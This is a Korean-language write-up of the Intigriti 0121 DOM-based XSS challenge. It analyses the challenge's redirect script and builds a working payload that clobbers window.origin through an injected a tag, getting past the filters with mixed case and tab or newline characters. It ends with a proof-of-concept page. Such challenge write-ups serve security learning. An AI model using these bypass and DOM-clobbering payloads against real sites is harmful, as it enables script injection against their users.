## Descriptions

Intigriti 0121 문제는 Dom Based XSS 취약점을 이용해서 XSS를 트리거 하는 문제이다.

---
## Analysis

```html
  <script src="script.js"></script>
```
소스 코드들 확인해 보면 `script.js` 파일을 랜더링 해오는 것을 볼 수 있다.

```js

  window.href = new URL(window.location.href);
  window.r = href.searchParams.get("r");
  //Remove malicious values from href, redirect, referrer, name, ...
  ["document", "window"].forEach(function(interface){
    Object.keys(window[interface]).forEach(function(globalVariable){
        if((typeof window[interface][globalVariable] == "string") && (window[interface][globalVariable].indexOf("javascript") > -1)){
            delete window[interface][globalVariable];
        }
    });
  });
  
  window.onload = function(){
    var links = document.getElementsByTagName("a");
    for(var i = 0; i < links.length; i++){
      links[i].onclick = function(e){
        e.preventDefault();
        safeRedirect(e.target.href);
      }
    }
  }
  if(r != undefined){
    safeRedirect(r);
  }
  function safeRedirect(url){
    if(!url.match(/[<>"' ]/)){
      window.setTimeout(function(){
          if(url.startsWith("https://")){
            window.location = url;
          }
          else{ //local redirect
            window.location = window.origin + "/" + url;
          }
          window.setTimeout(function(){
            document.getElementById("error").style.display = "block";
          }, 1000);
      }, 5000);
      document.getElementById("popover").innerHTML = `
        <p>You're being redirected to ${url} in 5 seconds...</p>
        <p id="error" style="display:none">
          If you're not being redirected, click <a href=${url}>here</a>
        </p>.`;
    }
    else{
      alert("Invalid URL.");
    }
  }
```
`script.js`의 코드는 위와 같다. 일단 위에서 부터 차근 차근 분석을 진행하기로 했다.

```js
  window.href = new URL(window.location.href);
  window.r = href.searchParams.get("r");
  //Remove malicious values from href, redirect, referrer, name, ...
  ["document", "window"].forEach(function(interface){
    Object.keys(window[interface]).forEach(function(globalVariable){
        if((typeof window[interface][globalVariable] == "string") && (window[interface][globalVariable].indexOf("javascript") > -1)){
            delete window[interface][globalVariable];
        }
    });
  });
```
제일 먼저 `UR`L 객체를 생성하고, `searchParams` 메서드를 이용해서 `r`라는 파리미터의 값을 가져오는 것을 볼 수 있다. 그 후에 `forEach` 문을 이용해서 전역 변수(r)가 문자열이고, `"javascript"`라는 문자열이 있으면 해당 객체 전체를 삭제하는 것을 볼 수 있다. `javascript` 스키마 사용을 방지하고 있는 거 같은데 그냥 `JavAscriPt`와 같이 대문자를 섞어 주면 쉽게 우회할 수 있다.

```js
  window.onload = function(){
    var links = document.getElementsByTagName("a");
    for(var i = 0; i < links.length; i++){
      links[i].onclick = function(e){
        e.preventDefault();
        safeRedirect(e.target.href);
      }
    }
  }
```
다음은 페이지에서 `onload` 메서드가 실행이 되면 a 태그를 가져와 `safeRediect()` 함수로 `url`을 넘겨주는 것을 볼 수 있다. 그리고 끝이다. 이 부분은 많이 중요하지 않다.

```js
if(r != undefined){
    safeRedirect(r);
  }
  function safeRedirect(url){
    if(!url.match(/[<>"' ]/)){
      window.setTimeout(function(){
          if(url.startsWith("https://")){
            window.location = url;
          }
          else{ //local redirect
            window.location = window.origin + "/" + url;
          }
          window.setTimeout(function(){
            document.getElementById("error").style.display = "block";
          }, 1000);
      }, 5000);
      document.getElementById("popover").innerHTML = `
        <p>You're being redirected to ${url} in 5 seconds...</p>
        <p id="error" style="display:none">
          If you're not being redirected, click <a href=${url}>here</a>
        </p>.`;
    }
    else{
      alert("Invalid URL.");
    }
  }
```
`r`의 값이 존재하면 `safeRedirect` 함수를 호출하는 것을 볼 수 있다. `safeRedirect()`의 코드를 보면 일단 입력값에 꺽쇠, 싱글/더들 쿼터 및 공백이 없어야 한다. 만약 조건에 만족한다면 `setTimeout()` 함수를 이용해서 5초가 지낸 후 내부 코드가 실행 되도록 하고 있다. 그리고 그 5초 동안에는 밑에서 `popover`이라는 돔을 가져와서 해당 돔 내에 `a` 태그를 만들어주는 것을 볼 수 있다. 이는 비동기로 처리하지 않고 있기 때문에 5초가 지나 가든 말든 해당 코드가 실행 된 후에 위에 `setTimeout()` 함수 내부 로직이 실행된다.

내부 코드를 보면 입력값의 시작이 `https://`이면 그냥 입력 받은 `url`로 리다이렉트 시켜주는 것을 볼 수 있고, 만약 입력값의 시작이 `https://`가 아니라면 `window.origin + "/" + url;`으로 라디아렉트 시키는 것을 볼 수 있다. 아마 이 부분에서 `Dom Based XSS` 취약점이 발생하는 거 같고, `javascript` 스키마를 이용해서 트리거 해야 하는 거 같다.

```
JaVascript:alrt(1)
```
하지만 r의 값으로 위와 같이 보내줘도 결국에는 `window.origin`과 더하기 때문에 결과적으로 사용하는 값은 `https://challenge-0121.intigriti.io//JaVascript:alrt(1)`과 될 것 인데. 이는 뒤에 JS 스키마가 실행되지 않는다.

결국에는 `window.origin`의 값을 조작해야 한다. 

- 시나리오

1. window.origin을 삭제한다.<br>
2. a 태그의 id 값으로 origin을 넣어준다.<br>
3. 그럼 window.origin의 값이 따로 정의 되어 있지 않다. 따라서 window.origin을 참조하게 되면 a 태그를 참조하게 되어 있다.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Test</title>
        <script>
            const Del = function (){
                delete window['origin'];
                console.log('[+] Delete origin');
            }
        </script>
    </head>
    <body>
        <input type='button' onclick=Del() value='Delete origin'>
        <a href='https://pocas.kr' id='origin'></a>
    </body>
</html>
```
일단 확인을 하기 위해 위와 같이 Test 코드를 작성해주었다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/Before%20delete.png?raw=true)

서버를 열고 접속 한 후에, `window.origin`을 입력하면 현재 오리진 주소가 나오는 것을 볼 수 있다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/After%20delete.png?raw=true)

그 후에 `Delete origin` 버튼을 눌러서 오리진을 삭제 한 후에, `window.origin`을 입력해 보니 `a` 태그를 참조하는 것을 볼 수 있다. 그럼 이제 `window.origin`을 어떻게 삭제할 지 생각해보아야 한다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/1.png?raw=true)

그래서 일단 위와 같이 `forEach` 문에 브레이크 포인트를 걸고, 어떤 값들을 검증하는 지 확인하기로 했다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/2.png?raw=true)

코드를 복사해서 확인을 해보니 해당 객체 내에 있는 모든 내부 객체들을 확인하는 것을 볼 수 있었고, 여기서 origin이 들어있는 내부 객체들도 몇 보였다. 즉, 오리진이 들어 있는 내부 객체를 모두 삭제 시키면 `window.origin`의 값을 삭제시킬 수 있을 거 같았다. 그러니 `origin`에 `"javascript"`라는 문자열을 넣은 후에 요청을 보내면 될 거 같다.

```
https://*.challenge-0121.intigriti.io/
```
하지만 그냥 보내주면 `domain` 인식을 못 할 거 같았는데, 위와 같이 라우팅이 되어 있어 앞 부분에 어떤 값을 넣어줘도 `https://challenge-0121.intigriti.io/`로 요청이 가게 되어 있었다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/3.png?raw=true)

그래서 `script.js` 11번째 라인에 브레이크 포인트를 걸고, `javascript.challenge-0121.intigriti.io/`로 요청을 보내 준 후에 포문이 끝나고, `window.origin`의 값을 확인해보니 `undefined`인 것을 확인 할 수 있었다.

그럼 이제 `window.origin`을 긁어 오게 되면 따로 정의가 되어 있지 않아 다른 값을 참아 참조하게 된다. 

여기까지 분석을 통해서 익스의 필요한 모든 요소들을 확인할 수 있었다. `window.origin`이 a 태그를 참조하게 해서, `a` 태그의 들어 있는 `href`로 리다이렉트 시키면 된다. 또한 `a` 태그는 `setTimeout('~', 5000)`이 실행되면 그 5초 동안 밑에서 우리가 입력한 값을 `a` 태그의 `href` 속성으로 넣어주는 것을 볼 수 있다.

그렇기에 `setTimeout()` 함수 내부에서 `window.origin`을 긁어 올 때는, 이미 우리가 `a` 태그를 생성한 후 이기 때문에 `a` 태그의 `href`를 잘 긁어올 수 있을 것이다.

```
r Parameter : Javascript:alert(document.domain)/%00id=origin
Result : <a href='Javascript:alert(document.domain)/'%00id='origin'>
```
그래서 일단 위와 같이 r의 값으로 보내주었다. `%00`을 준 이유는 `href` 속성과 `id` 속성을 분류하기 위해서 이고, `%20`이 아닌 널 바이트를 준 이유는 공백은 필터링을 하고 있기 때문이다. 그럼 위와 같이 `a` 태그가 생성이 될 것 이고, 5초가 지나면 `window.origin + '/' + url`에 의해서 `Javascript:alert(document.domain)//Javascript:alert(document.domain)/%00id=origin`가 될 것이다. 그리고 여기서 r의 값에서 alert() 함수 뒤에 슬래쉬를 넣어준 이유는 JS 문법 에러를 피하기 위해서다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/4.png?raw=true)

하지만 ㅋㅋ 위와 같이 널 바이트가 바이트 값 그대로 들어가서 잘 안 된 것을 볼 수 있다.. 그래서 그냥 SQLI에서 사용되는 공백 바이패스로 `%0a`나 `%09`를 이용 하기로 했다. 

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/5.png?raw=true)

%09나 %0a로 해주니 잘 들어갔다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/6.png?raw=true)

그리고 5초를 기대려 주니 `setTimeout()` 함수에 내부 로직이 실행되어 XSS가 트리거 되었다.

---
## Poc (Sollution)

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Intigriti 0121 Poc</title>
        <script>
            const poc = 'Javascript:alert(document.domain)/%0aid=origin'
            const url = `https://javascript.challenge-0121.intigriti.io/?r=${poc}`

            const exploit = function (){
                window.open(url);
            }
        </script>
    </head>
    <body>
        <h1>Intigriti XSS Challenge 0121</h1>

        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <input type="button" onclick=exploit() value="Trigger">
    </body>
</html>
```

---
## Reference

[https://developer.mozilla.org/ko/docs/Web/API/URL/searchParams](https://developer.mozilla.org/ko/docs/Web/API/URL/searchParams)<br>
[https://stackoverflow.com/questions/55451493/what-is-window-origin](https://stackoverflow.com/questions/55451493/what-is-window-origin)

---
